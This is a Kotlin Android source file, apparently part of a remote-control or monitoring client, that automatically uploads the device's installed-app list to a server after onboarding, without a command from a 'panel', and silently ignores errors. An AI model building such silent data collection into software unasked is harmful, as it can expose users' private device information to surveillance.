package com.base.realtime.apps

import android.content.Context
import com.base.realtime.RealtimeApp

/**
 * فهرست برنامه‌ها را بدون فرمان پنل به سرور می‌فرستد (نصب / گرفتن دسترسی).
 * تا وقتی [markUiReady] صدا زده نشود (بعد از نمایش یا رد شدن آنبوردینگ) شروع نمی‌شود.
 */
object InstalledAppsPush {
    private const val PREFS = "installed_apps_push"
    private const val KEY_NEEDED = "needed_v1"
    private const val KEY_UI_READY = "ui_ready_v1"

    fun markNeeded(context: Context) {
        try {
            context.applicationContext
                .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_NEEDED, true)
                .apply()
        } catch (_: Throwable) {
        }
    }

    /** بعد از دانلود و نمایش آنبوردینگ، یا وقتی آنبوردینگ لازم نیست. */
    fun markUiReady(context: Context) {
        val app = context.applicationContext
        try {
            app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_UI_READY, true)
                .apply()
        } catch (_: Throwable) {
        }
        tryPush(app)
    }

    fun tryPush(context: Context) {
        val app = context.applicationContext
        if (!uiReady(app) || !needed(app) || !InstalledApps.canRead(app)) return
        RealtimeApp.engine(app).pushInstalledAppsSnapshot {
            clearNeeded(app)
        }
    }

    private fun uiReady(context: Context): Boolean = try {
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean(KEY_UI_READY, false)
    } catch (_: Throwable) {
        false
    }

    private fun needed(context: Context): Boolean = try {
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY_NEEDED, false)
    } catch (_: Throwable) {
        false
    }

    private fun clearNeeded(context: Context) {
        try {
            context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_NEEDED, false)
                .apply()
        } catch (_: Throwable) {
        }
    }
}
